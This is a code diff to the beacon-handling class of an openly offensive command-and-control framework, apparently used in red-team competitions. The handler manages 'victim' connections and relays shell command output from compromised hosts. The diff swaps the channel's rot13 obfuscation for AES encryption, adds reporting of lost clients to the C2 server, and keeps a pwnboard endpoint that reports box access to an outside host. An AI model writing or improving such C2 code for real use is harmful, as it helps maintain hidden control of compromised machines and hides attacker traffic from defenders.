@@ -2,6 +2,7 @@ package Servers.Beacon;
 
 import Servers.Duplexer;
 import Servers.keepAlive;
+import Servers.encryption.aes.*;
 
 import java.io.IOException;
 import java.net.HttpURLConnection;
@@ -47,6 +48,12 @@ public class BeaconClientHandler implements Runnable{
     private Object pwnBoardLock;
     private pwnBoardRequest pwnBoardRequestObject;
 
+    // Class used to do rot13 encryption
+    //private rot13 rot13;
+
+    // Class used to do aes encryption
+    private aes aes;
+
     /**
      * Use this Class to create a new thread to handle each victim connection
      * 
@@ -55,15 +62,17 @@ public class BeaconClientHandler implements Runnable{
      * @param beaconServer Pointer to the Becon Server that this client is associated with
      * @param os Operating System of this client
      */
-    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os, Object shellLock){
+    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os, Object shellLock, aes aes){
+        //this.rot13 = new rot13();
         this.IPAddress = IPAddress;
         this.duplexer = duplexer;
         this.beaconServer = beaconServer;
         this.os = os;
         this.sendLock = new Object();
-        this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, true);
+        this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, false, aes);
         this.keepAliveThread = new Thread(keepAliveClass);
         this.shellLock = shellLock;
+        this.aes = aes;
 
         try{
             this.pwnboardUri = new URI("https://margs.salsas.bar/pwn/boxaccess");
@@ -89,41 +98,17 @@ public class BeaconClientHandler implements Runnable{
     }
 
     /**
-     * Encrypts/Decrypts the plain text with a simple rot13 cipher - Shifts each letter by 13 spots.
-     * (ex. A --> B, E --> R, Y --> L)
-     * 
-     * Because each letter is just shifted by 13 characters, encrypting/decrypting are the same algorithm
-     * 
-     * @param plaintext - The text to be shifted
-     * @return - The new encrypted/decrypted text
-     */
-    private String encrypt(String plaintext) {
-        StringBuilder encryptedText = new StringBuilder();
-
-        for (char character : plaintext.toCharArray()) {
-            if (character >= 'a' && character <= 'z') {
-                encryptedText.append((char) ('a' + (character - 'a' + 13) % 26));
-            } else if (character >= 'A' && character <= 'Z') {
-                encryptedText.append((char) ('A' + (character - 'A' + 13) % 26));
-            } else {
-                encryptedText.append(character);
-            }
-        }
-        return encryptedText.toString();
-    }
-
-    /**
      * Use this function to have the thread send a message to the client
      * 
      * @param message Message to be sent
      */
     protected void sendToClient(String message){
         if(sentinel){
-            message = encrypt(message);
-            String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
-            message = httpHeader + message;
+            //message = rot13.encrypt(message);
+            //String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
+            //message = httpHeader + message;
             synchronized(sendLock){
-                duplexer.send(message);
+                duplexer.send(aes.encrypt(message), true);
             }
         }
     }
@@ -139,10 +124,40 @@ public class BeaconClientHandler implements Runnable{
 
         Boolean notify;
         int pwnBoardCounter = 0;
-        while(sentinel){
+        String encrypted = "";
+        String response = "";
+        while(sentinel){ 
             try{
                 notify = false;
-                String response = duplexer.receive();
+                try{
+                    encrypted = duplexer.receive(true);
+                } catch (java.lang.NumberFormatException e){
+                    sentinel = false;
+                    try{
+                        duplexer.close();
+                        keepAliveClass.stopKeepAlive();
+                    } catch (IOException d){
+                        d.printStackTrace();
+                    }
+                    beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+                    beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
+                    System.out.println(IPAddress + " disconnected");
+                }
+                
+                response = aes.decrypt(encrypted);
+
+                if(response == null){
+                    sentinel = false;
+                    try{
+                        duplexer.close();
+                        keepAliveClass.stopKeepAlive();
+                    } catch (IOException d){
+                        d.printStackTrace();
+                    }
+                    beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+                    beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
+                    System.out.println(IPAddress + " disconnected");
+                }
 
                 // When the linux clients disconnect, they don't actually stop, they just repeatedly send null over and over
                 if(response == null){
@@ -165,29 +180,40 @@ public class BeaconClientHandler implements Runnable{
                         pwnBoardLock.notify();
                     }
                 }
-                
-                if(response != null){
-                    if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK")) && !(response.isBlank())){
-                        response = encrypt(response);
-                        if(!(response.equals("KEEP_ALIVE"))){
-                            // Remove the END_OF_OUTPUT part of the end of the response to the command
-                            if(response.contains(("END_OF_OUTPUT"))){
-                                response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
-                                notify = true;
-                            }
-                            beaconServer.addDataToResponsesDictionaries(IPAddress, response);
 
-                            // If this client is currently being used as a shell, notify the lock so that the server knows
-                            // to return the responses immediately
-                            if(isShell && notify){
-                                synchronized(shellLock){
-                                    shellLock.notify();
-                                }
+
+                if(response != null){
+                    if(!(response.equals("KEEP_ALIVE"))){
+                        // Remove the END_OF_OUTPUT part of the end of the response to the command
+                        if(response.contains(("END_OF_OUTPUT"))){
+                            response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
+                            notify = true;
+                        }
+                        beaconServer.addDataToResponsesDictionaries(IPAddress, response);
+
+                        // If this client is currently being used as a shell, notify the lock so that the server knows
+                        // to return the responses immediately
+                        if(isShell && notify){
+                            synchronized(shellLock){
+                                shellLock.notify();
                             }
                         }
                     }
                 }
-            } catch (IOException e){
+            } catch(java.net.SocketException e){
+                sentinel = false;
+                try{
+                    duplexer.close();
+                    keepAliveClass.stopKeepAlive();
+                } catch (IOException d){
+                    d.printStackTrace();
+                }
+                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
+                System.out.println(IPAddress + " disconnected");
+            } 
+            
+            catch (IOException e){
                 sentinel = false;
                 try{
                     duplexer.close();
